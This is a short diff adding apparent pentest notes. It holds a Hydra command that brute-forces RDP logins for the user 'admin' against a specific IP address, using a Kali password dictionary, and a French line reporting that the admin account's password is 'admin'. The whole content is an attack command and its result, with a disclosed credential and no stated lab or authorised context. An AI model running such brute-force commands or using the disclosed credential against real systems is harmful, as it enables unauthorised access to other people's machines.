@@ -1,0 +1,3 @@
+hydra -l admin -P /home/kali/dictionnaire/passwd.txt -t 4 20.4.55.190 rdp
+
+Le compte admin a comme mot de passe admin et comme password admin aussi
